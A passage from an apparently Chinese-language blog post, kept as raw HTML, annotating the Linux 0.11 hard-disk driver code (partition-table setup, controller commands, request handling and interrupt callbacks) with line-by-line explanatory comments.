&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125; &#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> NR_HD = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 硬盘分区结构体</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">hd_struct</span> &#123;</span></span><br><span class="line"><span class="keyword">long</span> start_sect;<span class="comment">// 分区在硬盘中的起始(绝对)扇区</span></span><br><span class="line"><span class="keyword">long</span> nr_sects;<span class="comment">// 分区所占的扇区总数</span></span><br><span class="line">&#125; hd[<span class="number">5</span>*MAX_HD]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读端口宏定义，从端口 port 读 nr 字，保存在 buf 中</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> port_read(port,buf,nr) \</span></span><br><span class="line"><span class="meta">__asm__(<span class="meta-string">&quot;cld;rep;insw&quot;</span>::<span class="meta-string">&quot;d&quot;</span> (port),<span class="meta-string">&quot;D&quot;</span> (buf),<span class="meta-string">&quot;c&quot;</span> (nr))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写端口宏定义，从 buf 中取数据，向端口 port 写 nr 字</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> port_write(port,buf,nr) \</span></span><br><span class="line"><span class="meta">__asm__(<span class="meta-string">&quot;cld;rep;outsw&quot;</span>::<span class="meta-string">&quot;d&quot;</span> (port),<span class="meta-string">&quot;S&quot;</span> (buf),<span class="meta-string">&quot;c&quot;</span> (nr))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">hd_interrupt</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">rd_load</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>接下来是在 init 函数中调用的 setup 系统调用，参数 BIOS 是 setup.s 程序取得并放置在 0x90080 处的包含两个硬盘参数的硬盘参数表指针（大小为 32 字节）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 71</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_setup</span><span class="params">(<span class="keyword">void</span> * BIOS)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> callable = <span class="number">1</span>;<span class="comment">// 限制本函数只能被调用 1 次</span></span><br><span class="line"><span class="keyword">int</span> i,drive;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> cmos_disks;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">partition</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!callable)<span class="comment">// 判断是否是第一次调用</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">callable = <span class="number">0</span>;<span class="comment">// 调用一次该标志就设置为 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HD_TYPE<span class="comment">// 如果没有定义 HD_TYPE，则读取硬盘参数</span></span></span><br><span class="line"><span class="keyword">for</span> (drive=<span class="number">0</span> ; drive&lt;<span class="number">2</span> ; drive++) &#123;<span class="comment">// 循环读取两个硬盘的参数</span></span><br><span class="line">hd_info[drive].cyl = *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *) BIOS;<span class="comment">// 柱面数</span></span><br><span class="line">hd_info[drive].head = *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) (<span class="number">2</span>+BIOS);<span class="comment">// 磁头数</span></span><br><span class="line">hd_info[drive].wpcom = *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *) (<span class="number">5</span>+BIOS);<span class="comment">// 写前预补偿柱面号</span></span><br><span class="line">hd_info[drive].ctl = *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) (<span class="number">8</span>+BIOS);<span class="comment">// 控制字节</span></span><br><span class="line">hd_info[drive].lzone = *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *) (<span class="number">12</span>+BIOS);<span class="comment">// 磁头着陆区柱面号</span></span><br><span class="line">hd_info[drive].sect = *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) (<span class="number">14</span>+BIOS);<span class="comment">// 每磁道扇区数</span></span><br><span class="line">BIOS += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hd_info[<span class="number">1</span>].cyl)<span class="comment">// 判断第二个硬盘柱面数是否为 0，为零表示只有一个硬盘</span></span><br><span class="line">NR_HD=<span class="number">2</span>;<span class="comment">// 设置硬盘数</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">NR_HD=<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">// hd 数组的第 0 项和 第 5 项分别表示两个硬盘的整体参数</span></span><br><span class="line"><span class="comment">// 第 1 ~ 4，6 ~ 9 项分别表示两个硬盘各自 4 个分区的参数</span></span><br><span class="line"><span class="comment">// 这里先只设置第 0 和第 5 项 </span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_HD ; i++) &#123;</span><br><span class="line">hd[i*<span class="number">5</span>].start_sect = <span class="number">0</span>;<span class="comment">// 起始扇区</span></span><br><span class="line">hd[i*<span class="number">5</span>].nr_sects = hd_info[i].head*<span class="comment">// 总扇区数</span></span><br><span class="line">hd_info[i].sect*hd_info[i].cyl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测硬盘是否是 AT 控制器兼容的</span></span><br><span class="line"><span class="comment">// 从 CMOS 偏移地址 0x12 处读出硬盘类型字节，如果高半个字节不为 0，表示系统至少有一个兼容硬盘</span></span><br><span class="line"><span class="keyword">if</span> ((cmos_disks = CMOS_READ(<span class="number">0x12</span>)) &amp; <span class="number">0xf0</span>)</span><br><span class="line"><span class="comment">// 如果低半个字节不为 0，表示系统有两个兼容硬盘</span></span><br><span class="line"><span class="keyword">if</span> (cmos_disks &amp; <span class="number">0x0f</span>)</span><br><span class="line">NR_HD = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">NR_HD = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 否则(高半个字节为 0)系统没有兼容硬盘</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">NR_HD = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 将不兼容的硬盘信息清空</span></span><br><span class="line"><span class="keyword">for</span> (i = NR_HD ; i &lt; <span class="number">2</span> ; i++) &#123;</span><br><span class="line">hd[i*<span class="number">5</span>].start_sect = <span class="number">0</span>;</span><br><span class="line">hd[i*<span class="number">5</span>].nr_sects = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 读取每个硬盘第一个盘块中的分区表信息，设置 hd 数组</span></span><br><span class="line"><span class="keyword">for</span> (drive=<span class="number">0</span> ; drive&lt;NR_HD ; drive++) &#123;</span><br><span class="line"><span class="comment">// 第一个参数 0x300 和 0x305 为两个硬盘的设备号，第二个参数 0 是取的块号</span></span><br><span class="line"><span class="keyword">if</span> (!(bh = bread(<span class="number">0x300</span> + drive*<span class="number">5</span>,<span class="number">0</span>))) &#123;<span class="comment">// bh 为空则停机</span></span><br><span class="line">printk(<span class="string">&quot;Unable to read partition table of drive %d\n\r&quot;</span>,</span><br><span class="line">drive);</span><br><span class="line">panic(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断第一个扇区最后两个字节是否为 0xAA55(硬盘的有效性)</span></span><br><span class="line"><span class="keyword">if</span> (bh-&gt;b_data[<span class="number">510</span>] != <span class="number">0x55</span> || (<span class="keyword">unsigned</span> <span class="keyword">char</span>)</span><br><span class="line">    bh-&gt;b_data[<span class="number">511</span>] != <span class="number">0xAA</span>) &#123;</span><br><span class="line">printk(<span class="string">&quot;Bad partition table on drive %d\n\r&quot;</span>,drive);</span><br><span class="line">panic(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">p = <span class="number">0x1BE</span> + (<span class="keyword">void</span> *)bh-&gt;b_data;<span class="comment">// 获取分区表地址</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;<span class="number">5</span>;i++,p++) &#123;<span class="comment">// 初始化 hd 数组 1 ~ 4，6 ~ 9 项</span></span><br><span class="line">hd[i+<span class="number">5</span>*drive].start_sect = p-&gt;start_sect;</span><br><span class="line">hd[i+<span class="number">5</span>*drive].nr_sects = p-&gt;nr_sects;</span><br><span class="line">&#125;</span><br><span class="line">brelse(bh);<span class="comment">// 释放 bh 缓冲块</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (NR_HD)<span class="comment">// 打印初始化分区表完成的信息</span></span><br><span class="line">printk(<span class="string">&quot;Partition table%s ok.\n\r&quot;</span>,(NR_HD&gt;<span class="number">1</span>)?<span class="string">&quot;s&quot;</span>:<span class="string">&quot;&quot;</span>);</span><br><span class="line">rd_load();<span class="comment">// 尝试在系统内存虚拟盘中加载启动盘中包含的根文件系统映像(如果有的话)</span></span><br><span class="line">mount_root();<span class="comment">// 安装根文件系统</span></span><br><span class="line"><span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是 main 函数中调用的 hd_init 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 345</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hd_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 设置硬盘设备请求处理函数为 do_hd_request</span></span><br><span class="line">blk_dev[MAJOR_NR].request_fn = DEVICE_REQUEST;</span><br><span class="line">set_intr_gate(<span class="number">0x2E</span>,&amp;hd_interrupt);<span class="comment">// 设置硬盘中断服务程序入口</span></span><br><span class="line">outb_p(inb_p(<span class="number">0x21</span>)&amp;<span class="number">0xfb</span>,<span class="number">0x21</span>);<span class="comment">// 允许从片发出中断请求信号</span></span><br><span class="line">outb(inb_p(<span class="number">0xA1</span>)&amp;<span class="number">0xbf</span>,<span class="number">0xA1</span>);<span class="comment">// 允许硬盘控制器发送中断请求信号</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向硬盘控制器发送命令的函数 hd_out，参数 drive 是驱动器号，nsect 是读写扇区数，sect 是起始盘区，head 是磁头号，cyl 是柱面号，cmd 是命令码，intr_addr 类型为函数指针，调用时此处需要传一个函数名，该函数将在硬盘中断处理程序中被调用（类似 hook）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 182</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hd_out</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> drive,<span class="keyword">unsigned</span> <span class="keyword">int</span> nsect,<span class="keyword">unsigned</span> <span class="keyword">int</span> sect,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> head,<span class="keyword">unsigned</span> <span class="keyword">int</span> cyl,<span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">void</span> (*intr_addr)(<span class="keyword">void</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">register</span> <span class="keyword">int</span> port <span class="title">asm</span><span class="params">(<span class="string">&quot;dx&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (drive&gt;<span class="number">1</span> || head&gt;<span class="number">15</span>)<span class="comment">// 驱动器号只能为 0/1，磁头号不能大于 15</span></span><br><span class="line">panic(<span class="string">&quot;Trying to write bad sector&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!controller_ready())<span class="comment">// 等待硬盘控制器就绪，如果等待一段时间后还没有就绪，死机</span></span><br><span class="line">panic(<span class="string">&quot;HD controller not ready&quot;</span>);</span><br><span class="line">do_hd = intr_addr;<span class="comment">// 设置硬盘中断处理时调用的函数</span></span><br><span class="line">outb_p(hd_info[drive].ctl,HD_CMD);<span class="comment">// 向控制寄存器输出控制字节，建立指定硬盘的控制方式</span></span><br><span class="line">port=HD_DATA;<span class="comment">// 之后几行向控制器端口 0x1f1 ~ 0x1f7 发送 7 字节的参数命令块</span></span><br><span class="line">outb_p(hd_info[drive].wpcom&gt;&gt;<span class="number">2</span>,++port);<span class="comment">// 写预补偿柱面号</span></span><br><span class="line">outb_p(nsect,++port);<span class="comment">// 读/写 扇区总数</span></span><br><span class="line">outb_p(sect,++port);<span class="comment">// 起始扇区</span></span><br><span class="line">outb_p(cyl,++port);<span class="comment">// 柱面号低 8 位</span></span><br><span class="line">outb_p(cyl&gt;&gt;<span class="number">8</span>,++port);<span class="comment">// 柱面号高 8 位</span></span><br><span class="line">outb_p(<span class="number">0xA0</span>|(drive&lt;&lt;<span class="number">4</span>)|head,++port);<span class="comment">// 驱动器号 + 磁头号</span></span><br><span class="line">outb(cmd,++port);<span class="comment">// 硬盘控制命令(如 WRITE/READ)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理硬盘当前请求项的函数 do_hd_request</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 296</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_hd_request</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,r;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> block,dev;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> sec,head,cyl;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nsect;</span><br><span class="line"></span><br><span class="line">INIT_REQUEST;<span class="comment">// 一个宏定义，上面写过，检查请求队列中是否有请求项及请求项的合法性</span></span><br><span class="line">dev = MINOR(CURRENT-&gt;dev);<span class="comment">// 取得子设备号</span></span><br><span class="line">block = CURRENT-&gt;sector;<span class="comment">// 请求的起始扇区</span></span><br><span class="line"><span class="comment">// 如果子设备号超出设备号范围或请求的扇区号大于分区中倒数第二个扇区号</span></span><br><span class="line"><span class="keyword">if</span> (dev &gt;= <span class="number">5</span>*NR_HD || block+<span class="number">2</span> &gt; hd[dev].nr_sects) &#123;</span><br><span class="line">end_request(<span class="number">0</span>);<span class="comment">// 结束请求</span></span><br><span class="line"><span class="keyword">goto</span> repeat;<span class="comment">// repeat 标号在 INIT_REQUEST 宏定义中</span></span><br><span class="line">&#125;</span><br><span class="line">block += hd[dev].start_sect;<span class="comment">// 加上子设备号对应分区的起始扇区号</span></span><br><span class="line">dev /= <span class="number">5</span>;<span class="comment">// 被 5 整除得到对应的硬盘号</span></span><br><span class="line">__asm__(<span class="string">&quot;divl %4&quot;</span>:<span class="string">&quot;=a&quot;</span> (block),<span class="string">&quot;=d&quot;</span> (sec):<span class="string">&quot;0&quot;</span> (block),<span class="string">&quot;1&quot;</span> (<span class="number">0</span>),</span><br><span class="line"><span class="string">&quot;r&quot;</span> (hd_info[dev].sect));<span class="comment">// 计算扇区号(sec)</span></span><br><span class="line">__asm__(<span class="string">&quot;divl %4&quot;</span>:<span class="string">&quot;=a&quot;</span> (cyl),<span class="string">&quot;=d&quot;</span> (head):<span class="string">&quot;0&quot;</span> (block),<span class="string">&quot;1&quot;</span> (<span class="number">0</span>),</span><br><span class="line"><span class="string">&quot;r&quot;</span> (hd_info[dev].head));<span class="comment">// 计算柱面号(cyl)</span></span><br><span class="line">sec++;</span><br><span class="line">nsect = CURRENT-&gt;nr_sectors;<span class="comment">// 读/写 扇区数</span></span><br><span class="line"><span class="keyword">if</span> (reset) &#123;<span class="comment">// 若复位标志置位</span></span><br><span class="line">reset = <span class="number">0</span>;<span class="comment">// 复位</span></span><br><span class="line">recalibrate = <span class="number">1</span>;<span class="comment">// 重新校正标志</span></span><br><span class="line">reset_hd(CURRENT_DEV);<span class="comment">// 重新校正硬盘</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (recalibrate) &#123;<span class="comment">// 如果重新校正标志置位</span></span><br><span class="line">recalibrate = <span class="number">0</span>;<span class="comment">//复位</span></span><br><span class="line">hd_out(dev,hd_info[CURRENT_DEV].sect,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">WIN_RESTORE,&amp;recal_intr);<span class="comment">// 向硬盘控制器发送重新校正命令</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (CURRENT-&gt;cmd == WRITE) &#123;<span class="comment">// 如果是写操作</span></span><br><span class="line">hd_out(dev,nsect,sec,head,cyl,WIN_WRITE,&amp;write_intr);<span class="comment">// 发送写命令</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span> ; i&lt;<span class="number">3000</span> &amp;&amp; !(r=inb_p(HD_STATUS)&amp;DRQ_STAT) ; i++)</span><br><span class="line"><span class="comment">/* nothing */</span> ;<span class="comment">// 循环读取状态寄存器信息，判断请求标志 DRQ_STAT 是否置位</span></span><br><span class="line"><span class="keyword">if</span> (!r) &#123;<span class="comment">// 如果等待结束还没有置位，表示写命令失败</span></span><br><span class="line">bad_rw_intr();<span class="comment">// 处理出现的问题，reset 标志置 1(硬盘复位)，判断是否允许重试</span></span><br><span class="line"><span class="keyword">goto</span> repeat;<span class="comment">// 继续处理请求</span></span><br><span class="line">&#125;</span><br><span class="line">port_write(HD_DATA,CURRENT-&gt;buffer,<span class="number">256</span>);<span class="comment">// 没出问题直接写</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CURRENT-&gt;cmd == READ) &#123;<span class="comment">// 如果是写操作</span></span><br><span class="line">hd_out(dev,nsect,sec,head,cyl,WIN_READ,&amp;read_intr);<span class="comment">// 发送读命令</span></span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">panic(<span class="string">&quot;unknown hd-command&quot;</span>);<span class="comment">// 不允许其他操作(cmd)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一类函数是硬盘中断处理过程中可被调用的函数，它们有 read_intr、write_intr、bad_rw_intr、recal_intr</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 252</span></span><br><span class="line"><span class="comment">// 读盘请求完成后在硬盘中断中被调用，</span></span><br><span class="line"><span class="comment">// 将一个扇区的数据从硬盘控制器的缓冲区读到内存的高速缓冲</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">read_intr</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (win_result()) &#123;<span class="comment">// 检查此次读命令操作是否出错</span></span><br><span class="line">bad_rw_intr();<span class="comment">// 出错则处理问题，reset 标志置 1(硬盘复位)，判断是否允许重试</span></span><br><span class="line">do_hd_request();<span class="comment">// 继续处理请求</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">port_read(HD_DATA,CURRENT-&gt;buffer,<span class="number">256</span>);<span class="comment">// 从数据寄存器端口将 1 各扇区读到高速缓冲中</span></span><br><span class="line">CURRENT-&gt;errors = <span class="number">0</span>;<span class="comment">// 设置出错次数为 0</span></span><br><span class="line">CURRENT-&gt;buffer += <span class="number">512</span>;<span class="comment">// 请求项的缓冲指针向后移动 1 个扇区</span></span><br><span class="line">CURRENT-&gt;sector++;<span class="comment">// 请求项的起始扇区递增</span></span><br><span class="line"><span class="keyword">if</span> (--CURRENT-&gt;nr_sectors) &#123;<span class="comment">// 读/写 操作的扇区数递减，并判断是否还有数据没读完</span></span><br><span class="line">do_hd = &amp;read_intr;<span class="comment">// 如果是的话再次设置硬盘中断中调用的函数为 read_intr</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">end_request(<span class="number">1</span>);<span class="comment">// 否则正常结束请求</span></span><br><span class="line">do_hd_request();<span class="comment">// 接着处理下一个请求(如果有)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在硬盘写命令结束时引发的硬盘中断中被调用，与 read_intr 逻辑相似</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">write_intr</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (win_result()) &#123;</span><br><span class="line">bad_rw_intr();</span><br><span class="line">do_hd_request();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (--CURRENT-&gt;nr_sectors) &#123;<span class="comment">// 如果数据没写完</span></span><br><span class="line">CURRENT-&gt;sector++;</span><br><span class="line">CURRENT-&gt;buffer += <span class="number">512</span>;</span><br><span class="line">do_hd = &amp;write_intr;<span class="comment">// 再次设置硬盘中断中调用的函数为 write_intr</span></span><br><span class="line">port_write(HD_DATA,CURRENT-&gt;buffer,<span class="number">256</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">end_request(<span class="number">1</span>);</span><br><span class="line">do_hd_request();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 244</span></span><br><span class="line"><span class="comment">// 读写硬盘失败调用的函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bad_rw_intr</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (++CURRENT-&gt;errors &gt;= MAX_ERRORS)<span class="comment">// 如果出错次数 &gt;= 7</span></span><br><span class="line">end_request(<span class="number">0</span>);<span class="comment">// 结束当前请求项</span></span><br><span class="line"><span class="keyword">if</span> (CURRENT-&gt;errors &gt; MAX_ERRORS/<span class="number">2</span>)<span class="comment">// 如果出错次数 &gt; 3</span></span><br><span class="line">reset = <span class="number">1</span>;<span class="comment">// 置位 reset 标志，复位硬盘控制器</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 289</span></span><br><span class="line"><span class="comment">// 重新校正函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">recal_intr</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (win_result())<span class="comment">// 判断上次命令结束后的状态</span></span><br><span class="line">bad_rw_intr();<span class="comment">// 如果出错，处理出错</span></span><br><span class="line">do_hd_request();<span class="comment">// 接着处理请求</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>剩下的函数为操作硬盘控制器的辅助函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 